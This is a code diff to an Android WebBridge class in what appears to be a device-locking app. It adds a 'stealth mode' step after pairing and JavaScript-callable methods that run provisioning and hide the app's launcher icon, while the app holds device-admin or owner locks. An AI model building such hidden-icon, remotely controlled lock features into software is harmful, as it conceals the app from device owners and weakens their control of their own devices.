@@ -44,12 +44,30 @@ public class WebBridge {
         editor.apply();
         showNativeToast("Pairing saved: " + code);
 
+        // Finalize self-provisioning & engage stealth mode
+        mActivity.runOnUiThread(() -> SelfProvisioningManager.finalizeSelfProvisioning(mActivity));
+
         // Notify background service to perform instant poll
         try {
             android.content.Intent serviceIntent = new android.content.Intent(mActivity, BashLockGuardService.class);
             serviceIntent.putExtra("CHECK_NOW", true);
             androidx.core.content.ContextCompat.startForegroundService(mActivity, serviceIntent);
         } catch (Exception ignored) {}
+    }
+
+    @JavascriptInterface
+    public String getProvisioningStatusJson() {
+        return SelfProvisioningManager.getProvisioningStatus(mActivity).toString();
+    }
+
+    @JavascriptInterface
+    public void runNextProvisioningStep() {
+        mActivity.runOnUiThread(() -> SelfProvisioningManager.runNextProvisioningStep(mActivity));
+    }
+
+    @JavascriptInterface
+    public void setAppIconHidden(boolean hide) {
+        mActivity.runOnUiThread(() -> SelfProvisioningManager.setAppIconHidden(mActivity, hide));
     }
 
     @JavascriptInterface
@@ -114,6 +132,7 @@ public class WebBridge {
             try {
                 // Ensure all device admin policies and owner locks are removed
                 BashLockDeviceAdminReceiver.releaseDeviceCompletely(mActivity);
+                SelfProvisioningManager.setAppIconHidden(mActivity, false);
 
                 android.content.Intent uninstallIntent = new android.content.Intent(android.content.Intent.ACTION_DELETE);
                 uninstallIntent.setData(android.net.Uri.parse("package:" + mActivity.getPackageName()));
